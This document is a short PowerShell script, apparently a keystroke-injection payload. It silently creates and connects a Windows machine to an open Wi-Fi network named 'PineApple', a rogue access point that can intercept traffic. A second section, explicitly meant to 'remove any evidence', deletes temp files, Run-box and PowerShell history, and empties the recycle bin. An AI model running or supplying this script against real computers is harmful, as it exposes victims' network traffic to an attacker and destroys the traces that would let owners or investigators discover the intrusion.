$profilefile="Home.xml"
$SSID="PineApple"
$SSIDHEX=($SSID.ToCharArray() |foreach-object {'{0:X}' -f ([int]$_)}) -join''
$xmlfile="<?xml version=""1.0""?>
<WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
<name>$SSID</name>
<SSIDConfig>
<SSID>
<hex>$SSIDHEX</hex>
<name>$SSID</name>
</SSID>
</SSIDConfig>
<connectionType>ESS</connectionType>
<connectionMode>manual</connectionMode>
<MSM>
<security>
<authEncryption>
<authentication>open</authentication>
<encryption>none</encryption>
<useOneX>false</useOneX>
</authEncryption>
</security>
</MSM>
</WLANProfile>
"
$XMLFILE > ($profilefile)
netsh wlan add profile filename="$($profilefile)"
netsh wlan connect name=$SSID

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
